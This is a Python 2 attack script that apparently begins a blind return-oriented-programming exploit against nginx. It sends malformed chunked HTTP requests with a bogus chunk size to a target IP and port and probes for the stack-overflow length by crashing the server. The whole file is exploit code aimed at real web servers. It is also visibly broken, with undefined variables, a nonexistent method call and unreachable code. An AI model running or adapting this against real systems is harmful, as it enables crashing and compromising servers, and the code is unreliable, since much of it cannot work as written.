import sys
import socket
import argparse

overflow_len = 0

class Nginx:
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port

	def exploit(self,data):
		sock = None
		while sock == None:
			sock = self.get_sock()
		d = "A" * 4096
		d += data
		s.write(d)
		s.flush() 

		alive = self.check_alive(s)

		if not alive:
			return "CRASH"
		req = ("0\r\n"
        		"\r\n"
        		"GET / HTTP/1.1\r\n"
        		"Host: bla.com\r\n"
        		"Transfer-Encoding: Chunked\r\n"
        		"Connection: Keep-Alive\r\n"
        		"\r\n")

		s.write(req)

		alive = self.check_alive(s)

		if not alive:
			return "NO CRASH"
		return "INFINITE LOOP"

	def check_alive(self,socket):
		socket.setblocking(False)
		for i in range(100):
			x = s.recv
			if len(x) == 0:
				return False
		socket.setblocking(True)
		return True
	def get_sock(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.ip,self.port))
		size = "\xde\xad\xbe\xef\xde\xad\xbe\xef"
		req = ("GET / HTTP/1.1\r\n"
				"Host: bla.com\r\n"
				"Transfer-Encoding: Chunked\r\n"
				"Connection: Keep-Alive\r\n"
				"\r\n")
		req += size +"\r\n"
		s.send(req)
		resp = s.recv()

		if resp == None or "200 OK" not in resp:
			print "No response from server"
			sys.exit(0)

		resp_len = 0
		while True:
			header = s.recv()
			if "Content-Length: " in header:
				resp_len = int(header.split()[1])
			if header is "\r\n": 
				break
		s.rect(resp_len)
		return s

def find_overflow_len(target):
	inc = 8
	overflow_len = inc
	while True:
		payload = "A" * overflow_len
		resp = target.exploit(payload)
		if resp == "CRASH":
			break
		overflow_len += inc

	if overflow_len == inc:
		print "Unreliable"
		sys.exit(0)

	overflow_len -= inc

	while True:
		payload = "A" * overflow_len
		resp = target.exploit(payload)
		if resp == "CRASH":
			break
		overflow_len+=1
	return

	overflow_len-=1
	print "Found overflow length - is: " + str(overflow_len) + " bytes!"

def brop():
	parser = argparse.ArgumentParser(description='Attempts to create an exploit given only a method to crash a remote service.')
	parser.add_argument('-ip', help='ip address of target system')
	parser.add_argument('-p', type=int, help='port target service is running on')
	args = parser.parse_args()
	nginx = Nginx(args.ip,args.p)
	find_overflow_len(nginx)

if __name__ == '__main__':
	brop()